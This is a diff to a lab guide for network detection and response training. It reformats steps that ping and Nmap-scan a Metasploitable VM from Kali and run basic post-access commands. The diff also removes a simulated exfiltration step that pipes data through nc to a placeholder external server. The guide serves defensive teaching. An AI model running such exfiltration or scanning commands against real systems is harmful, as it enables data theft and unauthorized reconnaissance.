@@ -98,11 +98,11 @@ Objective: Generate network traffic and identify open ports and services on the 
    ```
 
 6. Ping Metasploitable from Kali: Open a terminal in Kali Linux and run:
-  ```
-  ping <Metasploitable_IP>
-  ```
+   ```
+   ping <Metasploitable_IP>
+   ```
 
-  This sends ICMP echo requests to the Metasploitable VM, generating network traffic that can be monitored by NDR solutions.
+   This sends ICMP echo requests to the Metasploitable VM, generating network traffic that can be monitored by NDR solutions.
 
 7. Open a terminal in Kali Linux. Run Nmap to scan the Metasploitable VM:
    ```
@@ -147,17 +147,10 @@ Objective: Simulate actions an attacker might take after gaining access.
    ```
    
 2. Data Gathering: Run commands to gather system information on Metasploitable VM
-```
-uname -a
-whoami
-```
-
-3. Simulated Data Exfiltration:
-Use a command to send data to a controlled external server (or simply log it):
-```
-echo "Sensitive Data" | nc <your_external_server_IP> <port>
-```
-
+   ```
+   uname -a
+   whoami
+   ```
 **Activity 4: Monitoring and Analysis**
 
 Objective: Simulate monitoring and analyze alerts related to the activities performed.
